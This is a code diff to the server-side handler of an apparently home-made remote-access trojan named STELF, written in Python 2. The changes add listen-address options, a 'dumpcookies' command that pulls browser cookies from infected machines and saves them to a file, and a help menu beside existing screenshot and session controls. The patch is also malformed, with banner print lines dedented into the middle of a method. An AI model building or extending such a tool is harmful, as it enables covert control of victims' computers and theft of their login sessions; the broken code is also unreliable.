@@ -15,6 +15,8 @@ import zlib
 import base64
 import hashlib
 from PIL import Image
+import json
+import argparse
 
 import __builtin__ 
 
@@ -40,6 +42,11 @@ def print_good(data): print GOOD + data
 
 logging.basicConfig(filename='handler.log',level=logging.DEBUG, format="%(asctime)s %(levelname)s in %(funcName)s: %(message)s")
 logging.critical("\n--------------------START OF NEW LOG--------------------\n")
+
+parser = argparse.ArgumentParser(description='Awesome shell')
+parser.add_argument('-l','--lhost', metavar='<address>', help='address to listen on', action='store', default="0.0.0.0")
+parser.add_argument('-p','--port', metavar='<port>', help='port to listen on', action='store', default=8080, type=int)
+args = parser.parse_args()
 
 class ProxyConnection:
 	"""
@@ -344,7 +351,12 @@ class Client:
 		
 		return
 
-		
+	def save_cookies(self):
+		cookies = json.loads(self.recv().split(chr(253))[0])
+		with open("cookies_"+self.hostname, "w") as f:
+			for website in cookies.keys():
+				f.write("Website: "+website)
+				pass
 
 	def interact(self):
 		self.interacting = True
@@ -393,6 +405,11 @@ class Client:
 			elif user_input == "screenshot":
 				self.send(user_input)
 				self.display_snap(screenie=True)
+				user_input = "cd ."
+				
+			elif user_input in ["dumpcookies","cookiemonster","OM NOM NOM"]:
+				self.send(user_input)
+				self.save_cookies()
 				user_input = "cd ."
 
 			self.send(user_input)
@@ -467,7 +484,7 @@ class Handler:
 				self.current_id += 1
 				
 				data = cli.recv(4096)
-				logging.debug(data)
+				logging.debug("Received data: "+data.strip())
 				if data.startswith("GET"): continue
 				
 				aes = self.dh_exchange(cli)
@@ -501,7 +518,7 @@ class Handler:
 
 						if response != "PONG":
 							sys.stdout.write('\r'+' '*(len(readline.get_line_buffer())+2)+'\r')
-							print_bad("STELF session " + str(client.id) + " exited\n")
+							print_bad("STELF session " + str(client.id) + " disconnected.\n")
 							sys.stdout.write(Style.BRIGHT + Fore.RED + "handler" + Style.RESET_ALL + ">> " + readline.get_line_buffer())
 							sys.stdout.flush()
 
@@ -571,9 +588,20 @@ class Handler:
 						self.session_on_hold = the_chosen_one
 				self.interacting = False
 				
+			elif user_input == "help":
+				print_info("Available commands:")
+				print "(i)nteract [id] - Interact with client."
+				print "(l)ist - Print list of clients."
+print ""	
+print Style.BRIGHT+Fore.RED+r"  ____"+ r"______"+r"___"+ r" __   "+" ___ "+Style.RESET_ALL+"   /\\"
+print Style.BRIGHT+Fore.RED+r" / __|"+ r"_   _|"+r" __|"+ r"  |"+"  | __|"+Style.RESET_ALL+"  /__\\"
+print Style.BRIGHT+Fore.RED+" \\__ \\"+r" | | "+r"| __|"+ r"  |__"+"| _| "+Style.RESET_ALL+" /\\  /\\"
+print Style.BRIGHT+Fore.RED+r" |___/"+ r" |_| "+r"|___|"+ r"____|"+"|_|  "+Style.RESET_ALL+"/__\\/__\\"
+print Style.RESET_ALL
+				
 if not os.path.isfile("stelf.guid"):
 	print_info("Generating secret for authentication, it will be stored in 'stelf.guid'")
 	with open("stelf.guid", "wb") as f:
 		f.write(hashlib.sha512(str(random.randrange(10**100, (10**101)-1))).hexdigest()[:30])
 		
-handler = Handler("0.0.0.0",8080).run()
+handler = Handler(args.lhost,args.port).run()
